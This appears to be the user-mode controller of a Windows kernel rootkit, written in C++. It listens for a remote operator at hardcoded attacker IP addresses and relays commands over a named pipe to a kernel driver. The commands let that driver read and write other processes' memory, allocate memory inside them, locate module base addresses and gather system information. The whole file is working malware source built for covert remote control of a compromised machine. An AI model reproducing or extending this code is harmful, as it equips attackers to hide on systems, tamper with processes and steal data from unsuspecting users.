#include "medium.h"
#include "rootreqs.h"
#include "piping.h"


BOOL ShouldQuit() {
    // Returns if the medium should stop working (debugging, forensics, special errors..) -
    return FALSE;
}


int MediumAct(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, LogFile* MediumLog) {
    int OprResult = 0;  // TODO: FIX FOR ALL ROOTKIT OPERATIONS, MAKE SURE TO continue IF EQUAL TO -1: PIPE FAILED, IsValidPipe = FALSE, need to create new
    DWORD LastError = 0;
    PASS_DATA result;
    PVOID SendBuf = NULL;
    ULONG SendSize = 0;
    BOOL IsRootkit = FALSE;
    BOOL IsValidPipe = TRUE;
    ROOTKIT_OPERATION RootStat = RKOP_NOOPERATION;
    ROOTKIT_MEMORY OprBuffer;
    PVOID LocalRead = NULL;
    PVOID AttrBuffer = NULL;
    PVOID InitialString = NULL;  // Usually receives a module name but can also receive other strings (such as debug message)
    ULONG ReadSize = 0;
    ULONG InitialSize = 0;
    ULONG64 AttrBufferSize = 0;
    BOOL ValidInit = FALSE;
    ROOTKIT_UNEXERR SysErrInit = successful;
    char MdlMalloc = 1;

    char GenValue = 212;
    char NextLine = '\n';
    char NullTerm = '\0';
    std::time_t curr = NULL;
    tm UtcTime;
    char TimeData[26];
    char UtcData[26];
    const char* RandomMsg1 = "IP data -\n";
    const char* RandomMsg2 = "Port number -\n";
    const char* RandomMsg3 = "Communication protocol: IPV4\n";
    const char* RandomMsg = "Random char numerical value generated: ";
    const char* BadTime = "Cannot get machine time\n";
    const char* LocalStr = "Local time on medium -> ";
    const char* UtcStr = "UTC (global) time on medium -> ";
    ULONG RandomSize1 = (ULONG)strlen(RandomMsg1) + 1;
    ULONG RandomSize2 = (ULONG)strlen(RandomMsg2) + 1;
    ULONG RandomSize3 = (ULONG)strlen(RandomMsg3) + 1;


    while (TRUE) {
        if (!IsValidPipe) {
            // Create valid pipe for communications:
            IsValidPipe = OpenPipe(PipeHandle, "\\\\.\\pipe\\ShrootPipe", MediumLog);
            while (!IsValidPipe) {
                IsValidPipe = OpenPipe(PipeHandle, "\\\\.\\pipe\\ShrootPipe", MediumLog);
            }

            // Connect to driver client with pipe:
            IsValidPipe = ConnectNamedPipe(*PipeHandle, NULL);
            if (!IsValidPipe) {
                LastError = GetLastError();
                if (LastError == ERROR_PIPE_CONNECTED) {
                    IsValidPipe = TRUE;
                    LastError = 0;
                    MediumLog->WriteLog((PVOID)"MainMedium pipe - driver already connected to pipe between creating it and connecting to it!\n", 94);
                }
                else {
                    MediumLog->WriteError("MainMedium pipe - error while connecting to pipe", LastError);
                    ClosePipe(PipeHandle);
                }
            }
            else {
                MediumLog->WriteLog((PVOID)"MainMedium pipe - driver connected to pipe like expected\n", 58);
            }
        }

        // Actual medium operations:
        while (IsValidPipe) {
            result = root_internet::RecvData(SndInfo.AsoSock, sizeof(RootStat), &RootStat, FALSE, 0);
            if (!result.err && result.value == sizeof(RootStat)) {
                if (ShouldQuit()) {
                    // Special error/event occured, should quit and stop working -
                    RootStat = RKOP_TERMINATE;
                    result = root_internet::SendData(SndInfo.AsoSock, &RootStat, sizeof(RootStat), FALSE, 0);
                    if (!result.err && result.value == sizeof(RootStat)) {
                        result = root_internet::RecvData(SndInfo.AsoSock, sizeof(RootStat), &RootStat, FALSE, 0);
                        if (!result.err && result.value == sizeof(RootStat) && RootStat == RKOP_TERMINATE) {
                            printf("Termination initiated from here accepted by tomed\n");
                        }
                    }

                    closesocket(SndInfo.AsoSock);
                    return -1;
                }

                // resend the type of request back to client -
                result = root_internet::SendData(SndInfo.AsoSock, &RootStat, sizeof(RootStat), FALSE, 0);
                if (!result.err && result.value == sizeof(RootStat)) {

                    switch (RootStat) {
                    case random:
                        // send random number to client -

                        SendSize = (ULONG)strlen(RandomMsg) + 2;
                        SendBuf = malloc(SendSize);
                        if (!SendBuf) {
                            SendBuf = NULL;
                            break;
                        }

                        memcpy(SendBuf, RandomMsg, strlen(RandomMsg) + 1);
                        memcpy((PVOID)((ULONG64)SendBuf + strlen(RandomMsg) + 1), &GenValue, sizeof(GenValue));
                        break;

                    case medata:
                        // send networking data about the client to the client -

                        SendSize = (ULONG)(3 * sizeof(SendSize) + RandomSize1 + RandomSize2 + RandomSize3 + sizeof(SndInfo.AddrInfo) + sizeof(SndInfo.Port));
                        SendBuf = malloc(SendSize);
                        if (!SendBuf) {
                            SendBuf = NULL;
                            break;
                        }

                        memcpy(SendBuf, &RandomSize1, sizeof(RandomSize1));
                        memcpy((PVOID)((ULONG64)SendBuf + sizeof(RandomSize1)), RandomMsg1, RandomSize1);
                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + sizeof(RandomSize1)), &RandomSize2, sizeof(RandomSize2));
                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + sizeof(RandomSize1) * 2), RandomMsg2, RandomSize2);
                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + RandomSize2 + sizeof(RandomSize1) * 2), &RandomSize3, sizeof(RandomSize3));
                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + RandomSize2 + sizeof(RandomSize1) * 3), RandomMsg3, RandomSize3);
                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + RandomSize2 + RandomSize3 + sizeof(RandomSize1) * 3), &SndInfo.Port, sizeof(SndInfo.Port));
                        memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + RandomSize2 + RandomSize3 + sizeof(SndInfo.Port) + sizeof(RandomSize1) * 3), &SndInfo.AddrInfo, sizeof(SndInfo.AddrInfo));
                        break;

                    case echo:
                        // receive a string and send it back to the client -

                        result = root_internet::RecvData(SndInfo.AsoSock, sizeof(SendSize), &SendSize, FALSE, 0);
                        if (result.err || result.value != sizeof(SendSize)) {
                            SendBuf = NULL;
                            break;
                        }

                        SendBuf = malloc(SendSize);
                        if (!SendBuf) {
                            SendBuf = NULL;
                            break;
                        }

                        result = root_internet::RecvData(SndInfo.AsoSock, SendSize, SendBuf, FALSE, 0);
                        if (result.err || result.value != SendSize) {
                            SendBuf = NULL;
                        }
                        printf("Received echo string: %s\n", (char*)SendBuf);
                        break;

                    case timereq:
                        // send the time on the current system to the client -

                        curr = std::time(0);
                        ctime_s(TimeData, 26, &curr);
                        gmtime_s(&UtcTime, &curr);
                        asctime_s(UtcData, 26, &UtcTime);

                        SendSize = (ULONG)(strlen(TimeData) + strlen(LocalStr) + 3 + strlen(UtcStr) + strlen(UtcData));
                        SendBuf = malloc(SendSize);
                        if (!SendBuf) {
                            printf("Could not allocate memory for sending buffer of current time\n");
                            SendBuf = NULL;
                            break;
                        }

                        memcpy(SendBuf, (void*)LocalStr, strlen(LocalStr));  // Local string, no \0
                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr)), (void*)TimeData, strlen(TimeData));  // Local time string, no \0
                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData)), &NextLine, 1);  // NextLine
                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData) + 1), (void*)UtcStr, strlen(UtcStr));  // UTC string, no \0
                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData) + strlen(UtcStr) + 1), (void*)UtcData, strlen(UtcData));  // UTC time string, no \0
                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData) + strlen(UtcStr) + strlen(UtcData) + 1), &NextLine, 1);  // NextLine
                        memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData) + strlen(UtcStr) + strlen(UtcData) + 2), &NullTerm, 1);  // NullTerm
                        break;

                    case terminatereq:
                        // terminate (request by client) -
                        closesocket(SndInfo.AsoSock);
                        return -1;

                    default: IsRootkit = TRUE; break;
                    }

                    // not an actual rootkit request -
                    if (!IsRootkit) {
                        if (SendBuf == NULL || result.err) {
                            printf("An error occured\n");
                            if (result.Term && result.err) {
                                printf("Critical error occured, closing connection with specific client..\n");
                                closesocket(SndInfo.AsoSock);
                                return -1;
                            }
                        }
                        else {
                            // Send response buffer -

                            root_internet::SendData(SndInfo.AsoSock, &SendSize, sizeof(SendSize), FALSE, 0);
                            root_internet::SendData(SndInfo.AsoSock, SendBuf, SendSize, FALSE, 0);
                            free(SendBuf);
                        }

                        // Clean important variables and network stack from last request -
                        root_internet::CleanNetStack(SndInfo.AsoSock);
                        SendSize = 0;
                        printf("FINISH MEDIUM FUNCTION FINISHED\n");
                        SendBuf = NULL;
                    }


                    else {
                        // an actual rootkit request -

                        // Receive the main module for the function -
                        result = root_internet::RecvData(SndInfo.AsoSock, sizeof(InitialSize), &InitialSize, FALSE, 0);
                        if (!result.err && result.value == sizeof(InitialSize)) {
                            InitialString = malloc(InitialSize);
                            if (InitialString != NULL) {
                                result = root_internet::SendData(SndInfo.AsoSock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0);
                                if (!result.err && result.value == sizeof(MdlMalloc)) {
                                    result = root_internet::RecvData(SndInfo.AsoSock, InitialSize, InitialString, FALSE, 0);
                                    if (!result.err && result.value == InitialSize) {
                                        ValidInit = TRUE;
                                        printf("Init string received - %s\n", (char*)InitialString);
                                    }
                                }
                            }
                            else {
                                MdlMalloc = 0;
                                root_internet::SendData(SndInfo.AsoSock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0);
                            }
                        }

                        if (!ValidInit) {
                            if (InitialString != NULL) {
                                free(InitialString);
                            }
                            RootStat = RKOP_NOOPERATION;
                        }
                        else {
                            ValidInit = FALSE;
                        }

                        switch (RootStat) {
                        case RKOP_WRITE:
                            // Write into process virtual memory (from user supplied buffer / another process) -
                            OprResult = WriteKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
                            if (OprResult != 1) {
                                printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                            }
                            free(InitialString);
                            break;

                        case RKOP_READ:
                            // Read from process virtual memory -
                            OprResult = ReadKernelCall(SndInfo.AsoSock, LocalRead, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
                            if (OprResult != 1) {
                                printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                            }
                            free(LocalRead);
                            free(InitialString);
                            break;

                        case RKOP_MDLBASE:
                            // Get the base address of a process module (executable) in memory -
                            printf("No extra buffer parameters for getting the module base..\n");
                            OprResult = MdlBaseKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
                            if (OprResult != 1) {
                                printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                            }
                            else {
                                printf("Base address of %s in memory: %p\n", (char*)InitialString, OprBuffer.Out);
                            }
                            free(InitialString);
                            break;

                        case RKOP_SYSINFO:
                            // return specific information about the target system (with ZwQuerySystemInformation) -

                            if (!ValidateInfoTypeString((char*)InitialString)) {
                                printf("Client sent invalid system info string\n");
                                free(InitialString);
                                break;
                            }

                            result = root_internet::RecvData(SndInfo.AsoSock, sizeof(AttrBufferSize), &AttrBufferSize, FALSE, 0);
                            if (result.err || result.value != sizeof(AttrBufferSize)) {
                                printf("Cannot get size of initial system buffer\n");
                                free(InitialString);
                                break;
                            }

                            AttrBuffer = malloc(AttrBufferSize);
                            if (AttrBuffer == NULL) {
                                printf("Cannot allocate initial system buffer\n");
                                free(InitialString);
                                SysErrInit = memalloc;
                            }
                            if (SysErrInit == successful) {
                                result = root_internet::RecvData(SndInfo.AsoSock, (int)AttrBufferSize, AttrBuffer, FALSE, 0);
                                if (result.err || result.value != AttrBufferSize) {
                                    printf("Cannot get initial system buffer\n");
                                    free(AttrBuffer);
                                    free(InitialString);
                                    break;
                                }
                            }

                            OprResult = SysInfoKernelCall(SndInfo.AsoSock, &OprBuffer, AttrBuffer, (char*)InitialString, SysErrInit, AttrBufferSize, PipeHandle, MediumLog);
                            if (OprResult != 1) {
                                printf("Failed operation (sending of returned struct / receiving OG struct/ UNEXPECTED ERROR FROM HERE)\n");
                            }
                            else {
                                result = root_internet::SendData(SndInfo.AsoSock, AttrBuffer, (int)AttrBufferSize, FALSE, 0);
                                if (result.err || result.value != AttrBufferSize) {
                                    free(AttrBuffer);
                                    free(InitialString);
                                    break;
                                }
                            }

                            printf("Success operation system information\n");
                            free(AttrBuffer);
                            free(InitialString);
                            break;

                        case RKOP_PRCMALLOC:
                            // Allocate memory in a specific process (and leave it committed for now) -
                            printf("No extra buffer parameters for allocating specific memory..\n");
                            OprResult = AllocSpecKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
                            if (OprResult != 1) {
                                printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                            }
                            free(InitialString);
                            break;

                        default:
                            printf("Error has occurred\n");
                            if (result.Term) {
                                printf("Critical error occurred, closing connection with specific client..\n");
                                closesocket(SndInfo.AsoSock);
                                return -1;
                            }
                            break;
                        }

                        // Clean important variables and network stack from last request -
                        root_internet::CleanNetStack(SndInfo.AsoSock);
                        SendSize = 0;
                        SendBuf = NULL;
                        SysErrInit = successful;
                        if (OprResult == -1) {
                            IsValidPipe = FALSE;
                            DisconnectNamedPipe(*PipeHandle);
                            ClosePipe(PipeHandle);
                        }
                        OprResult = 0;
                        printf("FINISH MEDIUM FUNCTION FINISHED\n");
                    }
                }
            }

            else {
                printf("Big error has occured\n");
                if (result.Term) {
                    printf("Critical error occured, closing connection with specific client..\n");
                    closesocket(SndInfo.AsoSock);
                    DisconnectNamedPipe(*PipeHandle);
                    ClosePipe(PipeHandle);
                    return 0;
                }
                break;
            }
        }
    }
    closesocket(SndInfo.AsoSock);
    DisconnectNamedPipe(*PipeHandle);
    ClosePipe(PipeHandle);
    return 0;
}


int main(int argc, char *argv[]) {
    SOCKET ssckt;
    int SockaddrLen = sizeof(sockaddr);
    char SrvIP[MAXIPV4_ADDRESS_SIZE] = { 0 };
    char SndIP[MAXIPV4_ADDRESS_SIZE] = { 0 };
    USHORT SrvPort = 44444;
    USHORT SndPort = 44444;
    NETWORK_INFO NetArr[3];
    HANDLE PipeHandle = INVALID_HANDLE_VALUE;
    BOOL IsValidPipe = FALSE;
    DWORD LastError = 0;
    LogFile MediumLog = { 0 };
    MediumLog.InitiateFile("C:\\nosusfolder\\verysus\\MediumLogFile.txt");

    // HARDCODED VALUE, GENERATED FROM ListAttacker IN trypack\AttackerFile\attackerips.txt
    const char* AttackAddresses = "172.18.144.1~172.19.144.1~172.30.48.1~172.23.32.1~172.17.160.1~172.21.0.1~172.24.112.1~192.168.47.1~192.168.5.1~192.168.1.21~172.20.48.1~192.168.56.1";

    // Create valid pipe for communications initial -
    IsValidPipe = OpenPipe(&PipeHandle, "\\\\.\\pipe\\ShrootPipe", &MediumLog);
    while (!IsValidPipe) {
        IsValidPipe = OpenPipe(&PipeHandle, "\\\\.\\pipe\\ShrootPipe", &MediumLog);
    }

    // Connect to driver client with pipe initial -
    IsValidPipe = ConnectNamedPipe(PipeHandle, NULL);
    if (!IsValidPipe) {
        LastError = GetLastError();
        if (LastError == ERROR_PIPE_CONNECTED) {
            IsValidPipe = TRUE;
            LastError = 0;
            MediumLog.WriteLog((PVOID)"MainMedium pipe - driver already connected to pipe between creating it and connecting to it!\n", 94);
        }
        else {
            MediumLog.WriteError("MainMedium pipe - error while connecting to pipe", LastError);
            MediumLog.CloseLog();
            DisconnectNamedPipe(PipeHandle);
            ClosePipe(&PipeHandle);
            return 0;
        }
    }
    else {
        MediumLog.WriteLog((PVOID)"MainMedium pipe - driver connected to pipe like expected\n", 58);
    }


    // Send initial message with PID of medium:
    if (InitialKernelCall(&PipeHandle, &MediumLog) == -1) {
        IsValidPipe = FALSE;
        DisconnectNamedPipe(PipeHandle);
        ClosePipe(&PipeHandle);
        return -1;
    }


    // Get IP addresses of target and attacker -
    if (!address_config::MatchIpAddresses(SrvIP, SndIP, AttackAddresses)) {
        printf("[-] Cannot find the target address and the matching attacker address!\n");
        MediumLog.CloseLog();
        DisconnectNamedPipe(PipeHandle);
        ClosePipe(&PipeHandle);
        return 0;
    }
    printf("Target: %s, Attacker: %s\n", SrvIP, SndIP);

    root_internet::SetNetStructs(SrvIP, SndIP, SrvPort, SndPort, NetArr);
    int result = root_internet::StartComms(NetArr);
    if (result == 1) {
        printf("Quitting (internet/socket communication initiation error)..\n");
        MediumLog.CloseLog();
        DisconnectNamedPipe(PipeHandle);
        ClosePipe(&PipeHandle);
        return 1;
    }

    while (TRUE) {
        printf(" here 3\n");

        // Accept connection
        ssckt = accept(NetArr[0].AsoSock, (sockaddr*)&NetArr[1].AddrInfo, &SockaddrLen);
        if (ssckt == INVALID_SOCKET) {
            std::cerr << "Could not accept connection with socket object: " << WSAGetLastError() << "\n";
        }
        else {
            NetArr[1].AsoSock = ssckt;
            result = root_internet::InitConn(NetArr[1], NetArr[0], NetArr[2]);
            root_internet::CleanNetStack(NetArr[1].AsoSock);
            printf(" here 4\n");
            if (result == 0) {
                printf("Initialization of connection succeeded, proceeding to start receiving requests..\n");
                result = MediumAct(NetArr[1], NetArr[0], &PipeHandle, &MediumLog);
                printf("Disconnected from (%s, %hu)\n", NetArr[1].IP, NetArr[1].Port);
                root_internet::CleanNetStack(NetArr[1].AsoSock);

                if (result == -1) {
                    printf("Termination Complete\n");
                    closesocket(NetArr[0].AsoSock);
                    WSACleanup();
                    MediumLog.CloseLog();
                    DisconnectNamedPipe(PipeHandle);
                    ClosePipe(&PipeHandle);
                    return 0;
                }
            }
            else {
                printf(" here 2\n");
                printf("Initialization of connection did not work correctly (socket/sender/conninfo errors)\n");
                closesocket(NetArr[1].AsoSock);
            }
        }
    }

    closesocket(NetArr[0].AsoSock);
    WSACleanup();
    MediumLog.CloseLog();
    DisconnectNamedPipe(PipeHandle);
    ClosePipe(&PipeHandle);
    return 0;
}
